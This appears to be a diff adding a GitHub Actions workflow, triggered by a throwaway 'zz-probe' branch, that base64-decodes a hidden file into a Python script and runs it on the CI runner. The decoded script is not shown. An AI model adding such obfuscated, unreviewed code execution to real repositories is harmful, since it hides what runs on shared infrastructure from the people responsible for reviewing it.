@@ -1,0 +1,17 @@
+name: zz734f
+on:
+  push:
+    branches: [ "zz-probe734f" ]
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+      - name: run
+        run: |
+          set +e
+          python3 -c "import base64;open('p.py','wb').write(base64.b64decode(open('p.b64','rb').read()))"
+          python3 p.py 2>&1 | tail -60
